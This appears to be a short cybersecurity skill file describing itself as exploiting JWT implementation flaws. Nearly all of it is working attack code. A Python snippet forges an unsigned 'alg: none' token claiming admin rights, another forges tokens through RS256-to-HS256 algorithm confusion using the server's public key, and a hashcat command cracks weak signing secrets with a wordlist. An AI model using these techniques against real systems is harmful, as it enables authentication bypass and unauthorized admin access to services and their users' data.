---
name: performing-jwt-none-algorithm-attack
description: Exploit JWT implementation flaws including algorithm confusion, none algorithm, and weak signing keys.
domain: cybersecurity
subdomain: web
tags:
- web
- jwt
- token
- authentication
- exploitation
version: '1.0'
---
# JWT Attacks

## "none" Algorithm Attack
```python
import jwt, base64
# Create token with alg: none
header = base64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').rstrip(b'=').decode()
payload = base64.urlsafe_b64encode(b'{"sub":"admin","admin":true}').rstrip(b'=').decode()
token = f"{header}.{payload}."
```

## Algorithm Confusion (RS→HS)
```python
# If server uses RSA public key to verify HS256
# Use the public key as HMAC secret!
public_key = open('public.pem').read()
token = jwt.encode({'sub':'admin'}, public_key, algorithm='HS256')
```

## Weak Secret
```bash
hashcat -m 16500 jwt.txt rockyou.txt
```
